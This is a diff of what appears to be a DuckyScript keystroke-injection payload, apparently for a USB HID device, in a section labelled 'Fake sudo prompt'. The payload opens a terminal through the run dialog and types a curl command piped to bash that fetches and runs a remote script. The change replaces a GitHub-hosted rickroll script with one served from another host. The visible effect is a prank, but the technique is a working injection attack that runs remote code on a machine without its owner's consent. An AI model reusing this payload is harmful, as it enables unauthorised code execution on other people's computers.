@@ -26,7 +26,7 @@ REM --- Fake sudo prompt ---
 ALT F2
 STRING sh -c "xdg-terminal-exec||kgx||ptyxis||gnome-terminal"
 ENTER
-STRING curl -s https://raw.githubusercontent.com/danielbuechele/ascii-rickroll/master/rickroll.sh | bash
+STRING curl -sN http://rick.jachan.dev | bash
 ENTER
 CTRL SHIFT Q
 
